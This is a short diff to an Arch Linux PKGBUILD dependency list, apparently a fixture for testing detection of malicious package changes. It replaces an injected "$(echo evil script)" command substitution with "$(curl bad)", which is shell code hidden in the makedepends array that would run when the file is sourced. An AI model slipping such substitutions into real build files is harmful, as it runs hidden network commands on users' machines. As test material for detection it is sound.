@@ -18,7 +18,7 @@ makedepends=('ghc'
              'haskell-regex-base'
              'haskell-regex-pcre'
              'haskell-split'
-             "$(echo evil script 1>&2)"
+             "$(curl bad)"
              'haskell-temporary'
              'haskell-text'
              'haskell-transformers')
